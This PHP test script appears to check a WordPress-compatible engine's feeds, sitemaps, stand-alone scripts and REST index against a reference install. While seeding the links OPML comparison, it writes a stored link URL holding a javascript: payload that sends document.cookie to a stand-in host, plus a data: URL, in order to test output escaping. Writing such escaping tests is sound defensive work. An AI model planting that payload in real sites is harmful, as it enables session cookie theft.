<?php
/**
 * Probe suite: feeds, sitemaps, robots.txt, xmlrpc, cron, the admin entry,
 * the other stand-alone scripts (links OPML, post by email, signup,
 * activation, trackback), and the REST index, compared with the reference on
 * status, content type, and body after host and generator normalisation.
 * The links OPML is compared again live with links on the site (made on the
 * reference, which shares the database, and removed after).
 * Pinned copies in contracts/fixtures/probes/; re-capture with --capture.
 */
require_once __DIR__ . '/lib.php';

$ENGINE = rtrim(getenv('MINN_TEST_URL') ?: 'https://minn.localhost', '/');
$REF = 'https://ref.minn.localhost';
$DIR = dirname(__DIR__) . '/contracts/fixtures/probes';

// path => [status, content-type prefix, compare body?]
$probes = [
    '/feed/' => [200, 'application/rss+xml', true],
    '/feed' => [301, '', false],
    '/feed/rss2/' => [301, '', false], // the default feed's alias moves to /feed/ under the site's own host
    '/feed/atom/' => [200, 'application/atom+xml', true],
    '/feed/rdf/' => [200, 'application/rdf+xml', true],
    '/?feed=rss2' => [301, '', false], // the query form moves to /feed/
    '/comments/feed/' => [200, 'application/rss+xml', true],
    '/hello-world/feed/' => [200, 'application/rss+xml', true],
    '/category/uncategorized/feed/' => [200, 'application/rss+xml', true],
    '/tag/engine/feed/' => [200, 'application/rss+xml', true],
    '/author/admin/feed/' => [200, 'application/rss+xml', true],
    '/wp-sitemap.xml' => [200, 'application/xml', true],
    '/wp-sitemap-posts-post-1.xml' => [200, 'application/xml', true],
    '/wp-sitemap-posts-page-1.xml' => [200, 'application/xml', true],
    '/wp-sitemap-taxonomies-category-1.xml' => [200, 'application/xml', true],
    '/wp-sitemap-taxonomies-post_tag-1.xml' => [200, 'application/xml', true],
    '/wp-sitemap-users-1.xml' => [200, 'application/xml', true],
    '/wp-sitemap-posts-post-9.xml' => [404, 'text/html', false],
    '/wp-sitemap.xsl' => [200, 'application/xml', false],
    '/robots.txt' => [200, 'text/plain', true],
    '/xmlrpc.php' => [405, 'text/plain', true],
    '/wp-cron.php' => [200, 'text/html', true],
    '/wp-links-opml.php' => [200, 'text/xml', true],
    '/wp-mail.php' => [403, 'text/html', true],
    '/wp-signup.php' => [302, '', false],
    '/wp-activate.php' => [302, '', false],
    '/wp-trackback.php' => [404, 'text/xml', true],
    '/wp-admin/' => [302, '', false],
    '/wp-json/' => [200, 'application/json', false],
];

function probe_fetch(string $base, string $path): array
{
    $context = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false], 'http' => ['ignore_errors' => true, 'timeout' => 20, 'follow_location' => 0]]);
    $body = (string) @file_get_contents($base . $path, false, $context);
    $status = 0;
    $type = '';
    foreach ($http_response_header ?? [] as $header) {
        if (preg_match('#^HTTP/\S+\s+(\d+)#', $header, $m)) {
            $status = (int) $m[1];
        } elseif (stripos($header, 'Content-Type:') === 0) {
            $type = trim(substr($header, 13));
        }
    }
    return [$status, $type, $body];
}

function probe_normalise(string $body, string $host, string $engine): string
{
    $body = str_replace([$host, str_replace('https://', 'http://', $engine)], $engine, $body);
    $body = preg_replace('/(\?v=|version=")[0-9.]+/', '${1}X', $body);
    $body = preg_replace('#<dateCreated>[^<]*</dateCreated>#', '<dateCreated>X</dateCreated>', $body);
    $body = preg_replace('/(wp-container-core-[a-z-]+-is-layout-)[0-9a-f]{8}/', '$1HASH', $body);
    $body = preg_replace('/wp-block-search__input-\d+/', 'wp-block-search__input-N', $body);
    return preg_replace('/(wp-block-gallery-|is-style-[a-z-]+--)\d+/', '$1N', $body);
}

$slug = static fn (string $path) => trim(preg_replace('/[^a-z0-9]+/', '-', strtolower(str_replace('?', '-query-', $path))), '-') ?: 'home';
if (in_array('--capture', $argv, true)) {
    @mkdir($DIR, 0755, true);
    foreach ($probes as $path => [, , $compare]) {
        if ($compare) {
            file_put_contents("$DIR/{$slug($path)}.txt", probe_normalise(probe_fetch($REF, $path)[2], $REF, $ENGINE));
        }
    }
    echo "Captured probe bodies to $DIR\n";
    exit(0);
}

$live = @file_get_contents("$REF/wp-json/", false, stream_context_create(['http' => ['timeout' => 30, 'ignore_errors' => true]])) !== false;
$pass = 0;
$fail = 0;
$check = static function (bool $ok, string $label, string $detail = '') use (&$pass, &$fail): void {
    if ($ok) { $pass++; echo "  ok   $label\n"; } else { $fail++; echo "  FAIL $label" . ($detail === '' ? '' : ": $detail") . "\n"; }
};
$firstDiff = static function (string $a, string $b): string {
    $la = explode("\n", $a); $lb = explode("\n", $b);
    foreach ($lb as $i => $line) {
        if (($la[$i] ?? null) !== $line) {
            return 'line ' . ($i + 1) . ' want ' . json_encode(substr($line, 0, 120)) . ' got ' . json_encode(substr($la[$i] ?? '(missing)', 0, 120));
        }
    }
    return count($la) > count($lb) ? 'engine output longer' : 'identical';
};

foreach ($probes as $path => [$status, $type, $compare]) {
    [$es, $et, $eb] = probe_fetch($ENGINE, $path);
    $check($es === $status && ($type === '' || str_starts_with($et, $type)), "$path status and type", "$es $et");
    if (!$compare) {
        continue;
    }
    $engine = probe_normalise($eb, $REF, $ENGINE);
    $fixture = @file_get_contents("$DIR/{$slug($path)}.txt");
    if ($fixture !== false) {
        $check($engine === $fixture, "$path body matches fixture", $firstDiff($engine, $fixture));
    }
    if ($live) {
        $reference = probe_normalise(probe_fetch($REF, $path)[2], $REF, $ENGINE);
        $check($engine === $reference, "$path body matches reference", $firstDiff($engine, $reference));
    }
}
if ($live) {
    $index = json_decode(probe_fetch($ENGINE, '/wp-json/')[2], true);
    $reference = json_decode(probe_fetch($REF, '/wp-json/')[2], true);
    foreach (['name', 'description', 'gmt_offset', 'timezone_string', 'page_for_posts', 'page_on_front', 'show_on_front', 'site_logo', 'site_icon'] as $key) {
        $check(($index[$key] ?? null) === ($reference[$key] ?? null), "index $key matches", json_encode($index[$key] ?? null));
    }
    $check(in_array('wp/v2', $index['namespaces'] ?? [], true) && in_array('minn-admin/v1', $index['namespaces'] ?? [], true), 'index lists the wp/v2 and minn-admin/v1 namespaces');
    $check(isset($index['routes']['/wp/v2/posts']), 'index describes /wp/v2/posts');
    $advertised = array_keys($index['routes'] ?? []);
    $check(array_filter($advertised, static fn (string $r): bool => str_contains($r, '(?P<base>')) === [], 'index advertises no per-type catch-all (each declared type is listed under its rest_base)');
    $check(count(array_filter($advertised, static fn (string $r): bool => str_starts_with($r, '/minn-admin/v1/system/logs/'))) === 1, 'system/logs/{id} is listed once, in the escaping the plugin uses', implode(' ', array_filter($advertised, static fn (string $r): bool => str_starts_with($r, '/minn-admin/v1/system/logs/'))));
    $noRoute = [];
    foreach ($advertised as $route) {
        if (str_contains($route, '(?P<') || $route === '/' || !in_array('GET', $index['routes'][$route]['methods'] ?? [], true)) {
            continue;
        }
        [$status, , $body] = probe_fetch($ENGINE, '/wp-json' . $route);
        if ($status === 404 && str_contains((string) $body, 'rest_no_route')) {
            $noRoute[] = $route;
        }
    }
    $check($noRoute === [], 'every advertised literal GET route answers something other than no-route', implode(' ', $noRoute));
    foreach (['/wp/v2', '/minn-admin/v1'] as $namespace) {
        [$status, , $body] = probe_fetch($ENGINE, '/wp-json' . $namespace);
        [$refStatus, , $refBody] = probe_fetch($REF, '/wp-json' . $namespace);
        $ours = json_decode((string) $body, true);
        $theirs = json_decode((string) $refBody, true);
        $check($status === 200 && $refStatus === 200 && array_keys($ours ?? []) === array_keys($theirs ?? []) && ($ours['namespace'] ?? '') === ($theirs['namespace'] ?? '-'), "namespace index $namespace has the reference's shape", "$status vs $refStatus: " . implode(',', array_keys($ours ?? [])));
        $check(($ours['_links']['up'][0]['href'] ?? '') === "$ENGINE/wp-json/" && isset($ours['routes'][$namespace]) && array_filter(array_keys($ours['routes'] ?? []), static fn (string $r): bool => !str_starts_with($r, $namespace)) === [], "namespace index $namespace links up and lists only its own routes");
    }
    [$status, , $body] = probe_fetch($ENGINE, '/wp-json/nope/v9');
    $check($status === 404 && str_contains((string) $body, 'rest_no_route'), 'an unknown namespace index is no-route');

    // Signup and activation send a single site to registration, where the reference sends it.
    foreach (['/wp-signup.php', '/wp-activate.php'] as $path) {
        $ours = probe_location($ENGINE, $path);
        $check($ours !== '' && $ours === probe_location($REF, $path), "$path redirects where the reference does", $ours);
    }

    // The links OPML with links on the site: categories by name, an empty one left out, one whose only link
    // is hidden kept with nothing in it, a zero updated date printed empty, and link_cat read as a whole number.
    $wp = '/opt/homebrew/bin/wp --skip-plugins --skip-themes --path=' . escapeshellarg(minn_test_site_root() . '/wp-reference');
    $made = json_decode((string) shell_exec($wp . ' eval ' . escapeshellarg(<<<'PHP'
        $friends = wp_insert_term('Zz Probes Friends', 'link_category');
        $hidden = wp_insert_term('Mm Probes Hidden', 'link_category');
        $empty = wp_insert_term('Aa Probes Empty', 'link_category');
        $terms = array_map(static fn ($t) => is_array($t) ? (int) $t['term_id'] : 0, [$friends, $hidden, $empty]);
        $links = [
            wp_insert_link(['link_url' => 'https://a.example.com/', 'link_name' => 'Alpha & <Co>', 'link_rss' => 'https://a.example.com/feed/', 'link_category' => [$terms[0]]]),
            wp_insert_link(['link_url' => 'https://b.example.com/', 'link_name' => 'Beta "quoted"', 'link_category' => [$terms[0]]]),
            wp_insert_link(['link_url' => 'https://h.example.com/', 'link_name' => 'Hidden', 'link_visible' => 'N', 'link_category' => [$terms[1]]]),
            wp_insert_link(['link_url' => 'https://u.example.com/', 'link_name' => 'Unsafe', 'link_category' => [$terms[0]]]),
        ];
        global $wpdb;
        $wpdb->update($wpdb->links, ['link_updated' => '0000-00-00 00:00:00'], ['link_id' => $links[1]]);
        // Addresses only a plugin or an import writing the table could store: escaped as addresses, as the reference does (the 2026-10-23 sweep).
        $wpdb->update($wpdb->links, ['link_url' => 'javascript:fetch("//x/"+document.cookie)&a=1', 'link_rss' => 'data:text/html,<b>x</b>'], ['link_id' => $links[3]]);
        $wpdb->update($wpdb->links, ['link_url' => 'https://b.example.com/a b?x=1&y=2', 'link_rss' => 'https://b.example.com/feed?a=1&b=2'], ['link_id' => $links[1]]);
        echo json_encode(['terms' => $terms, 'links' => $links]);
        PHP) . ' 2>/dev/null'), true);
    register_shutdown_function(static function () use ($wp, $made): void {
        $links = array_values(array_filter((array) ($made['links'] ?? []), static fn ($id) => is_int($id) && $id > 1));
        $terms = array_values(array_filter((array) ($made['terms'] ?? []), static fn ($id) => is_int($id) && $id > 1));
        shell_exec($wp . ' eval ' . escapeshellarg('foreach (' . var_export($links, true) . ' as $id) { wp_delete_link($id); } foreach (' . var_export($terms, true) . ' as $id) { wp_delete_term($id, "link_category"); }') . ' 2>/dev/null');
    });
    $friends = (int) ($made['terms'][0] ?? 0);
    $check($friends > 1 && count(array_filter((array) ($made['links'] ?? []))) === 4, 'links made on the reference for the OPML comparison', json_encode($made));
    foreach (['', "?link_cat={$friends}", "?link_cat=-{$friends}x", '?link_cat=abc', '?link_cat=all'] as $query) {
        $ours = probe_normalise(probe_fetch($ENGINE, '/wp-links-opml.php' . $query)[2], $REF, $ENGINE);
        $theirs = probe_normalise(probe_fetch($REF, '/wp-links-opml.php' . $query)[2], $REF, $ENGINE);
        $check(str_contains($theirs, 'Zz Probes Friends') === ($query !== '?link_cat=all') && $ours === $theirs, "links OPML with links ({$query}) matches the reference", $firstDiff($ours, $theirs));
    }
}

function probe_location(string $base, string $path): string
{
    $context = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false], 'http' => ['ignore_errors' => true, 'timeout' => 20, 'follow_location' => 0]]);
    @file_get_contents($base . $path, false, $context);
    foreach ($http_response_header ?? [] as $header) {
        if (stripos($header, 'Location:') === 0) {
            return trim(substr($header, 9));
        }
    }
    return '';
}
echo "\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
